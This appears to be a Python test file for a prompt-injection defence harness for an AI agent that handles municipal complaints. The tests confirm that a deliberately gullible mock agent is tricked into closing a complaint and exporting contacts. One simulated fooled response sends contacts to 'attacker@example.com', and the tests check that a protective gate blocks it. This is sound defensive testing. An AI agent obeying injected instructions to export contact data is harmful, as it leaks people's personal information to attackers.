import json

from sphilter.agents import GullibleMockAgent, LLMAgent
from sphilter.evaluate import run_scenario
from sphilter.scenarios import BY_ID, make_task


def test_mock_agent_is_actually_fooled():
    s = BY_ID["A1"]
    tools = [a.tool for a in GullibleMockAgent().propose(make_task("basic"), s.items())]
    assert "close_complaint" in tools and "export_contacts" in tools


def test_mock_agent_not_triggered_by_benign_text():
    for sid in ("B1", "B2", "B3", "B4", "B5", "B6"):
        s = BY_ID[sid]
        tools = {a.tool for a in GullibleMockAgent().propose(make_task(s.profile, s.target), s.items())}
        assert tools <= {"read_complaint", "draft_work_order", "send_email"}, (sid, tools)


def test_llm_adapter_parses_and_is_still_gated():
    fooled = lambda prompt: json.dumps([
        {"tool": "draft_work_order", "args": {"complaint_id": "C-101", "location": "Andheri Market Road",
                                              "issue": "garbage", "priority": "normal"}},
        {"tool": "export_contacts", "args": {"destination": "attacker@example.com"}}])
    s = BY_ID["A1"]
    r = run_scenario(s, "protected", agent=LLMAgent(fooled))
    assert r.violations == [] and r.legit_completed
    r2 = run_scenario(s, "baseline", agent=LLMAgent(fooled))
    assert any(v.startswith("export:") for v in r2.violations)


def test_llm_adapter_survives_garbage_output():
    assert LLMAgent(lambda p: "sorry, no json").propose(make_task("basic"), BY_ID["B1"].items()) == []
